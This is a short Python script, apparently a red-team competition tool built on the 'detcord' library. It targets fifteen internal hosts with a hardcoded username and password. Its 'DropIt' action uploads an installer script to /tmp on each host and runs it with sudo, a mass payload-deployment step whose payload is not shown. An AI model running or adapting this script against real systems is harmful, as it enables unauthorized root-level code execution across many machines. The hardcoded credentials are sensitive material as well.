from detcord import display, action

env = {}
hosts = []
for i in range(15):
    hosts.append("10.{}.2.5".format(str(i)))

print("Target hosts:")
print(hosts)
env['hosts'] = hosts
env['user'] = 'hannibal'
env['pass'] = 'N3xtGenH@ck3r101'

@action
def DropIt(host):
    host.put("install_bsd.sh", "/tmp/installer.sh")
    try:
        ret1 = host.run("chmod +x /tmp/installer.sh")
    except PermissionError as _:
        ret1 = host.run("chmod +x /tmp/installer.sh", sudo=True)
    ret2 = host.run("bash /tmp/installer.sh", sudo=True)
